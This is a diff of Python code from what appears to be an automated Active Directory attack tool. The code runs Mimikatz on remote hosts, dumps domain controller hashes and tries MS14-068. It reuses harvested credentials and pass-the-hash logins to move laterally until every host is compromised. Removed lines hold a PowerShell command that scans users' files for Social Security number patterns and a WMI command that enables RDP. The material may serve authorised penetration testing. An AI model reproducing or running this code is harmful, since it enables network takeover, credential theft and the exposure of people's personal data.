+            tmpHostList=[]
+            for y in accessAdmHostList:
+                tmpHostList.append(y[0])
 
-        if len(nbList)>0:
+            if len(nbList)>0:
+                for ip in nbList:
+                    if ip in tmpHostList:
+                        domain=domain.lower()
+                        username=username.lower()
+                        if [ip,domain,username,password] not in userPassList:
+                            userPassList.append([ip,domain,username,password])
+                        tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                        if len(tmpPasswordList)>0:
+                            for y in tmpPasswordList:
+                                if y not in userPassList:
+                                    userPassList.append(y)            
+                        if len(tmpPasswordList)>0:
+                            print "\n"
+                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
+                        tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
+                        if len(tmpHashList)>0:
+                            addHashes(ip,tmpHashList)
+                            if ip in uncompromisedHostList:
+                                uncompromisedHostList.remove(ip)                            
+                        analyzeHashes(tmpHashList)
+
+                        if len(dcList)>0:
+                            getDomainAdminUsers(username,password,dcList[0])
+                            domainShort,domainFull=reverseLookup(dcList[0])
+                            for x in tmpPasswordList:
+                                tmpdomain1=(x[1]).lower()
+                                tmpusername1=(x[2]).lower()
+                                tmppassword1=x[3]
+                                tmppasswordhash1=None
+                                if tmpdomain1==domainFull.lower() or tmpdomain1==domainShort.lower():
+                                    if tmpusername1 in domainAdminList and dcCompromised==False:
+                                        print (setColor("[+]", bold, color="green"))+" Found Domain Admin Credentials in Memory on Host: "+ip                    
+                                        getDomainAdminUsers(tmpusername1,tmppassword1,dcList[0])
+                                        tmpPasswordList=runMimikatz(dcList[0],tmpdomain1,tmpusername1,tmppassword1,tmppasswordhash1)
+                                        if len(tmpPasswordList)>0:
+                                            for y in tmpPasswordList:
+                                                if y not in userPassList:
+                                                    userPassList.append(y)            
+                                        if len(tmpPasswordList)>0:
+                                            print "\n"
+                                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
+                                        tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
+                                        if len(tmpHashList)>0:
+                                            addHashes(ip,tmpHashList)
+                                            if ip in uncompromisedHostList:
+                                                uncompromisedHostList.remove(ip)                            
+                                        analyzeHashes(tmpHashList)
+                                        dcCompromised=True
+
+                        if optionTokenPriv==True:
+                            if ip not in dcList and dcCompromised==False:
+                                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
+                                tokensPriv(ip,domain,username,password,passwordHash)
+
+        else:
+            if len(dcList)>0:
+                mountSysvol(domain,username,password)
+                for ip in dcList:
+                    tmpHostList=[]
+                    for y in accessAdmHostList:
+                        tmpHostList.append(y[0])
+                    if ip in tmpHostList:
+                        domain=domain.lower()
+                        username=username.lower()
+                        if [ip,domain,username,password] not in userPassList:
+                            userPassList.append([ip,domain,username,password])
+                        if dcCompromised==False:
+                            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                            for y in tmpPasswordList:
+                                if y not in userPassList:
+                                    userPassList.append(y)            
+                            if len(tmpPasswordList)>0:
+                                print "\n"
+                            print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
+                            tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
+                            if len(tmpHashList)>0:
+                                addHashes(ip,tmpHashList)
+                                if ip in uncompromisedHostList:
+                                    uncompromisedHostList.remove(ip)
+                                for ip in dcList:
+                                    tmpHostList=[]
+                                    for z in accessAdmHostList:
+                                        tmpHostList.append(z[0])
+                                    if ip not in tmpHostList:
+                                        if [ip, domain, tmpusername, tmppassword] not in accessAdmHostList:
+                                            accessAdmHostList.append([ip, domain, tmpusername, tmppassword])
+                            analyzeHashes(tmpHashList)
+                            if optionTokenPriv==True:
+                                if ip not in dcList and dcCompromised==False:
+                                    print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
+                                    tokensPriv(ip,domain,username,password,passwordHash)
+
             for ip in nbList:
-                if ip in tmpHostList:
-                    domain=domain.lower()
-                    username=username.lower()
-                    if [ip,domain,username,password] not in userPassList:
-                        userPassList.append([ip,domain,username,password])
-                    tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
-                    if len(tmpPasswordList)>0:
-                        for y in tmpPasswordList:
-                            if y not in userPassList:
-                                userPassList.append(y)            
-                    if len(tmpPasswordList)>0:
-                        print "\n"
-                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
-                    tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
-                    if len(tmpHashList)>0:
-                        addHashes(ip,tmpHashList)
-                        if ip in uncompromisedHostList:
-                            uncompromisedHostList.remove(ip)                            
-                    analyzeHashes(tmpHashList)
-
-                    if len(dcList)>0:
-                        getDomainAdminUsers(username,password,dcList[0])
-                        domainShort,domainFull=reverseLookup(dcList[0])
-                        for x in tmpPasswordList:
-                            tmpdomain1=(x[1]).lower()
-                            tmpusername1=(x[2]).lower()
-                            tmppassword1=x[3]
-                            tmppasswordhash1=None
-                            if tmpdomain1==domainFull.lower() or tmpdomain1==domainShort.lower():
-                                if tmpusername1 in domainAdminList and dcCompromised==False:
-                                    print (setColor("[+]", bold, color="green"))+" Found Domain Admin Credentials in Memory on Host: "+ip                    
-                                    getDomainAdminUsers(tmpusername1,tmppassword1,dcList[0])
-                                    tmpPasswordList=runMimikatz(dcList[0],tmpdomain1,tmpusername1,tmppassword1,tmppasswordhash1)
-                                    if len(tmpPasswordList)>0:
-                                        for y in tmpPasswordList:
-                                            if y not in userPassList:
-                                                userPassList.append(y)            
-                                    if len(tmpPasswordList)>0:
-                                        print "\n"
-                                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip                    
-                                    tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
-                                    if len(tmpHashList)>0:
-                                        addHashes(ip,tmpHashList)
-                                        if ip in uncompromisedHostList:
-                                            uncompromisedHostList.remove(ip)                            
-                                    analyzeHashes(tmpHashList)
-                                    dcCompromised=True
-
-                    if optionTokenPriv==True:
-                        if ip not in dcList and dcCompromised==False:
-                            print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
-                            tokensPriv(ip,domain,username,password,passwordHash)
-
-    else:
-        if len(dcList)>0:
-            mountSysvol(username,password)
-            for ip in dcList:
                 tmpHostList=[]
                 for y in accessAdmHostList:
                     tmpHostList.append(y[0])
@@ -4634,210 +5166,216 @@ if skipMode==False:
                     username=username.lower()
                     if [ip,domain,username,password] not in userPassList:
                         userPassList.append([ip,domain,username,password])
-                    if dcCompromised==False:
-                        tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
-                        for y in tmpPasswordList:
-                            if y not in userPassList:
-                                userPassList.append(y)            
-                        if len(tmpPasswordList)>0:
-                            print "\n"
-                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
-                        tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
-                        if len(tmpHashList)>0:
-                            addHashes(ip,tmpHashList)
-                            if ip in uncompromisedHostList:
-                                uncompromisedHostList.remove(ip)
-                            for ip in dcList:
-                                tmpHostList=[]
-                                for z in accessAdmHostList:
-                                    tmpHostList.append(z[0])
-                                if ip not in tmpHostList:
-                                    if [ip, domain, tmpusername, tmppassword] not in accessAdmHostList:
-                                        accessAdmHostList.append([ip, domain, tmpusername, tmppassword])
-                        analyzeHashes(tmpHashList)
+
+                    tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                    for y in tmpPasswordList:
+                        if y not in userPassList:
+                            userPassList.append(y)      
+                    if len(tmpPasswordList)>0:
+                        print "\n"
+
+                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
+                    tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
+                    if len(tmpHashList)>0:
+                        addHashes(ip,tmpHashList)
+                    if len(tmpHashList)>0 or len(tmpPasswordList)>0:
+                        if ip in uncompromisedHostList:
+                            uncompromisedHostList.remove(ip)
+                    analyzeHashes(tmpHashList)
+                    for y in userPassList:
+                        if len(dcList)>0 and len(domainAdminList)<1:
+                            tmpdomain=y[1]
+                            tmpusername=y[2]
+                            tmppassword=y[3]
+                            getDomainAdminUsers(tmpusername,tmppassword,dcList[0])
+                            dcDomainNameList=reverseLookup(dcList[0])
+                    domainShort,domainFull=reverseLookup(ip)
+                    if len(dcList)>0:
+                        for y in userPassList:
+                            if dcCompromised==False:
+                                tmpdomain=(y[1]).lower()
+                                tmpusername=y[2]
+                                tmppassword=y[3]
+                                tmppasswordHash=None
+                                if domainShort.lower()==tmpdomain or domainFull.lower()==tmpdomain:
+                                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],domainFull,False)        
+                                    if tmpAdminOK==True:
+                                        tmpPasswordList=runMimikatz(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
+                                        for y in tmpPasswordList:
+                                            if y not in userPassList:
+                                                userPassList.append(y)      
+                                        if len(tmpPasswordList)>0:
+                                            print "\n"
+                                        print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
+                                        tmpHashList=dumpDCHashes(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
+                                        if len(tmpHashList)>0:
+                                            addHashes(dcList[0],tmpHashList)
+                                            if dcList[0] in uncompromisedHostList:
+                                                uncompromisedHostList.remove(dcList[0])
+                                        analyzeHashes(tmpHashList)
+                                        dcCompromised=True
+                    if len(uncompromisedHostList)>0:
                         if optionTokenPriv==True:
                             if ip not in dcList and dcCompromised==False:
                                 print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                                 tokensPriv(ip,domain,username,password,passwordHash)
+        '''
+        if len(accessAdmHostList):
+            print "\nADMIN$ Access on the Below Hosts"
+        print tabulate(accessAdmHostList)
+        if len(accessOKHostList):
+            print "\nCredentials Valid on the Below Hosts"
+        print tabulate(accessOKHostList)
+        '''
 
-        for ip in nbList:
-            tmpHostList=[]
-            for y in accessAdmHostList:
-                tmpHostList.append(y[0])
-            if ip in tmpHostList:
-                domain=domain.lower()
-                username=username.lower()
-                if [ip,domain,username,password] not in userPassList:
-                    userPassList.append([ip,domain,username,password])
+        if len(dcList)>0:
+            for ip in dcList:
+                if isDA==True and dcCompromised==False:
+                    tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                    for y in tmpPasswordList:
+                        if y not in userPassList:
+                            userPassList.append(y)   
+            if isDA==False and dcCompromised==False:      
+                #if domain==None or len(domain)<1:
+                #    domain="WORKGROUP"  
+                #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
+                #mountSysvol(username,password)
+                if optionMS14068==True and domainAuthenticationOK==True:
+                    tmpPassList,tmpHashList=testMS14_068(ip,domain,username,password,passwordHash)
+                    if len(tmpPassList)>0 or len(tmpHashList)>0:
+                        for x in tmpHashList:
+                            hashList.append(x)
+                        for x in tmpPassList:
+                            passList.append(x)
 
-                tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
-                for y in tmpPasswordList:
-                    if y not in userPassList:
-                        userPassList.append(y)      
-                if len(tmpPasswordList)>0:
-                    print "\n"
-
-                print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
-                tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
-                if len(tmpHashList)>0:
-                    addHashes(ip,tmpHashList)
-                if len(tmpHashList)>0 or len(tmpPasswordList)>0:
-                    if ip in uncompromisedHostList:
-                        uncompromisedHostList.remove(ip)
-                analyzeHashes(tmpHashList)
-                for y in userPassList:
-                    if len(dcList)>0 and len(domainAdminList)<1:
-                        tmpdomain=y[1]
-                        tmpusername=y[2]
-                        tmppassword=y[3]
-                        getDomainAdminUsers(tmpusername,tmppassword,dcList[0])
-                        dcDomainNameList=reverseLookup(dcList[0])
-                domainShort,domainFull=reverseLookup(ip)
-                if len(dcList)>0:
-                    for y in userPassList:
-                        if dcCompromised==False:
-                            tmpdomain=(y[1]).lower()
-                            tmpusername=y[2]
-                            tmppassword=y[3]
+                        for x in tmpPassList:
+                            tmpusername=x[1]
+                            tmppassword=x[2]
                             tmppasswordHash=None
-                            if domainShort.lower()==tmpdomain or domainFull.lower()==tmpdomain:
-                                tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],domainFull,False)        
-                                if tmpAdminOK==True:
-                                    tmpPasswordList=runMimikatz(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
-                                    for y in tmpPasswordList:
-                                        if y not in userPassList:
-                                            userPassList.append(y)      
-                                    if len(tmpPasswordList)>0:
-                                        print "\n"
-                                    print (setColor("[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
-                                    tmpHashList=dumpDCHashes(dcList[0],domainFull,tmpusername,tmppassword,tmppasswordHash)
-                                    if len(tmpHashList)>0:
-                                        addHashes(dcList[0],tmpHashList)
-                                        if dcList[0] in uncompromisedHostList:
-                                            uncompromisedHostList.remove(dcList[0])
-                                    analyzeHashes(tmpHashList)
+                            if dcCompromised==False:
+                                print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
+                                tmpHashList=dumpDCHashes(dcList[0],domain,tmpusername,tmppassword,tmppasswordHash)
+                                if len(tmpHashList)>0:
+                                    addHashes(dcList[0],tmpHashList)
+                                    if dcList[0] in uncompromisedHostList:
+                                        uncompromisedHostList.remove(dcList[0])
+                                    for dc in dcList:
+                                        tmpHostList=[]
+                                        for z in accessAdmHostList:
+                                            tmpHostList.append(z[0])
+                                        if dc not in tmpHostList:
+                                            if [dc, domain, tmpusername, tmppassword] not in accessAdmHostList:
+                                                accessAdmHostList.append([dc, domain, tmpusername, tmppassword])
                                     dcCompromised=True
-                if len(uncompromisedHostList)>0:
-                    if optionTokenPriv==True:
-                        if ip not in dcList and dcCompromised==False:
-                            print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
-                            tokensPriv(ip,domain,username,password,passwordHash)
-    '''
-    if len(accessAdmHostList):
-        print "\nADMIN$ Access on the Below Hosts"
-    print tabulate(accessAdmHostList)
-    if len(accessOKHostList):
-        print "\nCredentials Valid on the Below Hosts"
-    print tabulate(accessOKHostList)
-    '''
+                                analyzeHashes(tmpHashList)
 
-    if len(dcList)>0:
-        for ip in dcList:
-            if isDA==True and dcCompromised==False:
-                tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
-                for y in tmpPasswordList:
-                    if y not in userPassList:
-                        userPassList.append(y)   
-        if isDA==False and dcCompromised==False:      
-            #if domain==None or len(domain)<1:
-            #    domain="WORKGROUP"  
-            #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
-            #mountSysvol(username,password)
-            if optionMS14068==True:
-                tmpPassList,tmpHashList=testMS14_068(ip,domain,username,password,passwordHash)
-                if len(tmpPassList)>0 or len(tmpHashList)>0:
-                    for x in tmpHashList:
-                        hashList.append(x)
-                    for x in tmpPassList:
-                        passList.append(x)
-
-                    for x in tmpPassList:
-                        tmpusername=x[1]
-                        tmppassword=x[2]
-                        tmppasswordHash=None
-                        if dcCompromised==False:
-                            print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Domain Controller: "+dcList[0]
-                            tmpHashList=dumpDCHashes(dcList[0],domain,tmpusername,tmppassword,tmppasswordHash)
+        else:        
+            if len(uncompromisedHostList)>0:
+                for ip in nbList:     
+                    if ip in uncompromisedHostList:         
+                        tmpFound=False
+                        tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain,False)
+                        if tmpLoginOK==True:
+                            domain=domain.lower()
+                            username=username.lower()
+                            if [ip,domain,username,password] not in userPassList:
+                                userPassList.append([ip,domain,username,password])
+                        if tmpAdminOK==True:
+                            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                            for y in tmpPasswordList:
+                                if y not in userPassList:
+                                    userPassList.append(y)     
+                            print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
+                            tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
                             if len(tmpHashList)>0:
-                                addHashes(dcList[0],tmpHashList)
-                                if dcList[0] in uncompromisedHostList:
-                                    uncompromisedHostList.remove(dcList[0])
-                                for dc in dcList:
-                                    tmpHostList=[]
-                                    for z in accessAdmHostList:
-                                        tmpHostList.append(z[0])
-                                    if dc not in tmpHostList:
-                                        if [dc, domain, tmpusername, tmppassword] not in accessAdmHostList:
-                                            accessAdmHostList.append([dc, domain, tmpusername, tmppassword])
+                                addHashes(ip,tmpHashList)
+                                if ip in uncompromisedHostList:
+                                    uncompromisedHostList.remove(ip)
                                 dcCompromised=True
                             analyzeHashes(tmpHashList)
 
-    else:        
-        if len(uncompromisedHostList)>0:
-            for ip in nbList:     
-                if ip in uncompromisedHostList:         
-                    tmpFound=False
-                    tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,ip,domain,False)
-                    if tmpLoginOK==True:
-                        domain=domain.lower()
-                        username=username.lower()
-                        if [ip,domain,username,password] not in userPassList:
-                            userPassList.append([ip,domain,username,password])
-                    if tmpAdminOK==True:
-                        tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
-                        for y in tmpPasswordList:
-                            if y not in userPassList:
-                                userPassList.append(y)     
-                        print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+ip
-                        tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)
-                        if len(tmpHashList)>0:
-                            addHashes(ip,tmpHashList)
-                            if ip in uncompromisedHostList:
-                                uncompromisedHostList.remove(ip)
-                            dcCompromised=True
-                        analyzeHashes(tmpHashList)
+                            if optionTokenPriv==True:
+                                if ip not in dcList and dcCompromised==False:
+                                    print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
+                                    tokensPriv(ip,domain,username,password,passwordHash)
 
-                        if optionTokenPriv==True:
-                            if ip not in dcList and dcCompromised==False:
-                                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
-                                tokensPriv(ip,domain,username,password,passwordHash)
 
-    if len(uncompromisedHostList)>0 and len(userPassList)>0:
-        print (setColor("\nReusing Credentials and Hashes For Lateral Movement in the Network", bold, color="green"))
-    complete=False
-    complete1=False
-    lastCount=0
-    testedHostList=[]
-    while complete==False:
-        if len(uncompromisedHostList)<1:
-            complete=True
-        else:
-            while complete1==False:
-                for y in uncompromisedHostList:            
-                    if len(userPassList)>0:
-                        for x in userPassList:
-                            for z in uncompromisedHostList:
-                                tmpip=z
-                                tmpdomain=(x[1]).lower()
-                                tmpusername=((x[2]).lower()).strip()
-                                tmppassword=x[3]
-                                tmppasswordHash=None
-                                #if (tmpusername.lower()).strip()=="administrator":
-                                if len(tmppassword)>0 and tmppassword!='(null)' and tmpusername!="guest":
-                                    if tmpip not in compromisedHostList:
-    
-                                            testedHostList.append([tmpip,tmpusername,tmppassword])
-                                            tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain,False)
-                                            if tmpLoginOK==False and tmpAdminOK==False:
-                                                testedHostList.append([tmpip,tmpusername,tmppassword])
+        if len(uncompromisedHostList)>0 and len(userPassList)>0 and len(uncompromisedHostList)!=len(userPassList):
+            print (setColor("\nReusing Credentials and Hashes For Lateral Movement in the Network", bold, color="green"))
+            complete=False
+            complete1=False
+            lastCount=0
+            testedHostList=[]
+            while complete==False:
+                if len(uncompromisedHostList)<1:
+                    complete=True
+                else:
+                    while complete1==False:
+                        for y in uncompromisedHostList:            
+                            if len(userPassList)>0:
+                                for x in userPassList:
+                                    for z in uncompromisedHostList:
+                                        tmpip=z
+                                        tmpdomain=(x[1]).lower()
+                                        tmpusername=((x[2]).lower()).strip()
+                                        tmppassword=x[3]
+                                        tmppasswordHash=None
+                                        #if (tmpusername.lower()).strip()=="administrator":
+                                        if len(tmppassword)>0 and tmppassword!='(null)' and tmpusername!="guest":
+                                            if tmpip not in compromisedHostList:
+            
+                                                    testedHostList.append([tmpip,tmpusername,tmppassword])
+                                                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain,False)
+                                                    if tmpLoginOK==False and tmpAdminOK==False:
+                                                        testedHostList.append([tmpip,tmpusername,tmppassword])
+                                                    if tmpLoginOK==True:
+                                                        if [tmpip,domain,username,password] not in userPassList:
+                                                            userPassList.append([tmpip,domain,username,password])
+                                                    if tmpAdminOK==True:   
+                                                        tmpPasswordList=runMimikatz(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+                                                        for z in tmpPasswordList:
+                                                            if z not in userPassList:
+                                                                userPassList.append(z)                        
+                                                        print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+tmpip                
+                                                        tmpHashList=dumpDCHashes(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+                                                        if len(tmpHashList)>0:
+                                                            addHashes(tmpip,tmpHashList)
+                                                            if tmpip in dcList:
+                                                                dcCompromised=True
+                                                            if tmpip in uncompromisedHostList:
+                                                                uncompromisedHostList.remove(tmpip)
+                                                        if optionTokenPriv==True and dcCompromised==False:
+                                                            if tmpip not in dcList:
+                                                                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
+                                                                tokensPriv(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+                                                        if tmpip not in compromisedHostList:
+                                                            compromisedHostList.append(tmpip)       
+
+                            if len(userHashList)>0:
+                                for x in userHashList:
+                                    for z in uncompromisedHostList:
+                                        tmpip=z
+                                        tmpdomain=(x[1]).lower()
+                                        tmpusername=(x[2]).lower()
+                                        tmppasswordHash=x[3]
+                                        tmppassword=None        
+                                        if tmpip not in compromisedHostList:
+                                            tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain,False)                    
                                             if tmpLoginOK==True:
                                                 if [tmpip,domain,username,password] not in userPassList:
                                                     userPassList.append([tmpip,domain,username,password])
-                                            if tmpAdminOK==True:   
+                                            if tmpAdminOK==True:
                                                 tmpPasswordList=runMimikatz(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
-                                                for z in tmpPasswordList:
-                                                    if z not in userPassList:
-                                                        userPassList.append(z)                        
+                                                for y in tmpPasswordList:
+                                                    tmpdomain1=y[1]
+                                                    tmpusername1=y[2]
+                                                    tmppassword1=y[3]
+                                                    tmppasswordHash1=None
+                                                    tmpLoginOK1,tmpAdminOK1=testDomainCredentials(tmpusername1,tmppassword1,tmppasswordHash1,tmpip,tmpdomain1,False)                    
+                                                    if tmpLoginOK1==True:
+                                                        if y not in userPassList:
+                                                            userPassList.append(y)                        
+
                                                 print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+tmpip                
                                                 tmpHashList=dumpDCHashes(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                                 if len(tmpHashList)>0:
@@ -4846,177 +5384,61 @@ if skipMode==False:
                                                         dcCompromised=True
                                                     if tmpip in uncompromisedHostList:
                                                         uncompromisedHostList.remove(tmpip)
-                                                if optionTokenPriv==True and dcCompromised==False:
-                                                    if tmpip not in dcList:
+                                                if optionTokenPriv==True:
+                                                    if tmpip not in dcList and dcCompromised==False:
                                                         print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
                                                         tokensPriv(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
                                                 if tmpip not in compromisedHostList:
                                                     compromisedHostList.append(tmpip)       
 
-                    if len(userHashList)>0:
-                        for x in userHashList:
-                            for z in uncompromisedHostList:
-                                tmpip=z
-                                tmpdomain=(x[1]).lower()
-                                tmpusername=(x[2]).lower()
-                                tmppasswordHash=x[3]
-                                tmppassword=None        
-                                if tmpip not in compromisedHostList:
-                                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,tmpip,tmpdomain,False)                    
-                                    if tmpLoginOK==True:
-                                        if [tmpip,domain,username,password] not in userPassList:
-                                            userPassList.append([tmpip,domain,username,password])
-                                    if tmpAdminOK==True:
-                                        tmpPasswordList=runMimikatz(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
-                                        for y in tmpPasswordList:
-                                            tmpdomain1=y[1]
-                                            tmpusername1=y[2]
-                                            tmppassword1=y[3]
-                                            tmppasswordHash1=None
-                                            tmpLoginOK1,tmpAdminOK1=testDomainCredentials(tmpusername1,tmppassword1,tmppasswordHash1,tmpip,tmpdomain1,False)                    
-                                            if tmpLoginOK1==True:
-                                                if y not in userPassList:
-                                                    userPassList.append(y)                        
 
-                                        print (setColor("\n[+]", bold, color="green"))+" Dumping Hashes from Host: "+tmpip                
-                                        tmpHashList=dumpDCHashes(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
-                                        if len(tmpHashList)>0:
-                                            addHashes(tmpip,tmpHashList)
-                                            if tmpip in dcList:
-                                                dcCompromised=True
-                                            if tmpip in uncompromisedHostList:
-                                                uncompromisedHostList.remove(tmpip)
-                                        if optionTokenPriv==True:
-                                            if tmpip not in dcList and dcCompromised==False:
-                                                print (setColor("\nEnumerating Tokens and Attempting Privilege Escalation", bold, color="green"))
-                                                tokensPriv(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
-                                        if tmpip not in compromisedHostList:
-                                            compromisedHostList.append(tmpip)       
+                            if lastCount==len(uncompromisedHostList):
+                                complete1=True
+                            lastCount=len(uncompromisedHostList)
 
 
-                    if lastCount==len(uncompromisedHostList):
-                        complete1=True
-                    lastCount=len(uncompromisedHostList)
+            print (setColor("\nList of Passwords in Database", bold, color="green"))
+            if len(userPassList)<1:
+                print "No passwords found"
+            else:
+                tmpuserPassList=userPassList
+                userPassList1=[]
+                for x in tmpuserPassList:
+                    tmpip=x[0]
+                    tmpdomain=(x[1]).lower()
+                    tmpusername=(x[2]).lower()
+                    tmppassword=x[3]
+                    if len(tmpdomain)<1 or tmpdomain!=None:
+                        if [tmpip,tmpdomain,tmpusername,tmppassword] not in userPassList1:
+                            userPassList1.append([tmpip,tmpdomain,tmpusername,tmppassword])
+
+                print tabulate(userPassList1)
+                #analyzePasswords(userPassList)
+
+            print (setColor("\nList of Hashes in Database", bold, color="green"))
+            if len(userHashList)<1:
+                print "No hashes found\n"
+            else:
+                print tabulate(userHashList)
+                analyzeHashes1(userHashList)
 
 
-        print (setColor("\nList of Passwords in Database", bold, color="green"))
-        if len(userPassList)<1:
-            print "No passwords found"
-        else:
-            tmpuserPassList=userPassList
-            userPassList1=[]
-            for x in tmpuserPassList:
-                tmpip=x[0]
-                tmpdomain=(x[1]).lower()
-                tmpusername=(x[2]).lower()
-                tmppassword=x[3]
-                if len(tmpdomain)<1 or tmpdomain!=None:
-                    if [tmpip,tmpdomain,tmpusername,tmppassword] not in userPassList1:
-                        userPassList1.append([tmpip,tmpdomain,tmpusername,tmppassword])
+            if len(accessAdmHostList)>0:
+                print (setColor("Admin Access on the Below Hosts", bold, color="green"))
+                print tabulate(accessAdmHostList)
 
-            print tabulate(userPassList1)
-            #analyzePasswords(userPassList)
+            if len(uncompromisedHostList)>0:
+                print (setColor("List of Hosts Uncompromised", bold, color="green"))
+                for x in uncompromisedHostList:
+                    print x
+            else:
+                print (setColor("\n[+]", bold, color="green"))+" All hosts have been compromised. Continuing with Post Exploitation modules"                
+            complete=True
 
-        print (setColor("\nList of Hashes in Database", bold, color="green"))
-        if len(userHashList)<1:
-            print "No hashes found\n"
-        else:
-            print tabulate(userHashList)
-            analyzeHashes1(userHashList)
-
-
-        if len(accessAdmHostList)>0:
-            print (setColor("Admin Access on the Below Hosts", bold, color="green"))
-            print tabulate(accessAdmHostList)
-
-        if len(uncompromisedHostList)>0:
-            print (setColor("List of Hosts Uncompromised", bold, color="green"))
-            for x in uncompromisedHostList:
-                print x
-        else:
-            print (setColor("\n[+]", bold, color="green"))+" All hosts have been compromised. Continuing with Post Exploitation modules"                
-        complete=True
-
-if args.module=='pii':
-    print (setColor("\nFinding Personally identifiable information (PII)", bold, color="green"))
-    tmpResultList=[]
-    command='Get-ChildItem -Path "c:\\Users" -Recurse -Force -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf, *.ppt, *.pptx | Select-String \"[0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" | Select-Object Path, Line, LineNumber | Export-CSV C:\\windows\\pii.txt'
-    for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=findPII(ip,domain,username,password,passwordHash)
-        tmpResultList=results.split("\n")
-        tmpCount=0
-        for x in tmpResultList:
-            if tmpCount>1:
-                print x
-            tmpCount+=1
-
-if args.module=="rdp":
-    if len(accessAdmHostList)>0:
-        print (setColor("\n[*] Enabling RDP on Hosts that were not enabled", bold, color="green"))
-        if len(rdpList)==len(nbList):
-            print "RDP has been enabled on all hosts"
-        else:
-            dict={}        
-            for x in accessAdmHostList:
-                ip=x[0]
-                domain=x[1]
-                username=x[2]
-                password=x[3]
-                if len(x[3])==65 and x[3].count(":")==1:
-                    passwordHash=x[3]
-                    password=None
-                else:
-                    password=x[3]
-                    passwordHash=None
-                if ip not in rdpList:
-                    print "Enabling RDP on Host: "+ip
-                    command=powershellCmdStart+" -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
-                    results,status=runWMIEXEC(ip, domain, username, password, passwordHash, command)  
